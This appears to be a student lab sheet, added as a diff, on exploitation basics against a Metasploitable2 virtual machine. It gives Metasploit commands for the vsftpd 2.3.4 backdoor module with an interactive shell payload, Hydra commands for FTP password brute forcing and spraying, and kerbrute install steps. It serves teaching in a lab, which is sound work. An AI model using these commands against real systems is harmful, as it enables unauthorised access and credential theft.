@@ -1,0 +1,60 @@
+Exp3-Exploitation Basics : Metasploit, Gaining access to machines using vulnerabilities, Custom 
+exploitation scripts, Password brute forcing, Password spraying.  
+----------------------------------------------------------------------------------
+Metasploit
+
+Note
+Open Both Kali and MetaSpoliable2 OS
+here the RHOST IP refers to MetaSpoliable2 OS IP address
+
+>>sudo msfconsole
+>>msf> search 
+>>msf6 > search vsftpd
+>>msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+>>set RHOSTS 192.168.155.94
+>>Msf6 exploit(exploit/unix/ftp/vsftpd_234_backdoor)>set payload cmd/unix/interact
+>>Msf6 exploit(exploit/unix/ftp/vsftpd_234_backdoor)>exploit
+>>whoami
+
+----------------------------------------------------------------------------------
+Password brute forcing
+Hydra
+
+Note>>Perform the attack where ever the Password list and Username list available 
+(cd Desktop which means both the list must be in desktop)
+>>Make sure Metaspolable2 OS is open and running
+
+1.Create User Name List
+2.Create PasswordList
+>>cat UserName.txt
+>>cat PassWordsList
+5.hydra -L UserName.txt -P PassWordsList <Target IP metaspos> ftp
+or
+hydra -l <knownusername> -P PassWordsList <Target IP metaspos> ftp
+
+-----------------------------------------------------------------------------------
+Password spraying
+[Using Hydra]
+
+Note>>Perform the attack where ever the Password list and Username list available 
+(cd Desktop which means both the list must be in desktop)
+>>Make sure Metaspolable2 OS is open and running
+
+1. Create User Name List
+2.>>cat UserName.txt
+hydra -L UserName.txt -p <known password> <Target IP metaspos2> ftp
+
+---------------------------------------------------------------------------
+Kerbrute (Not Required-Avoid)
+https://github.com/ropnop/kerbrute
+https://github.com/ropnop/kerbrute/releases
+
+1.Open terminal in Downloads
+>>ls
+>>mv kerbrute_linux_amd64 kerbrute
+>>ls
+>>kerbrute
+>>chmod +x kerbrute
+>>sudo mv kerbrute /usr/local/bin
+
+
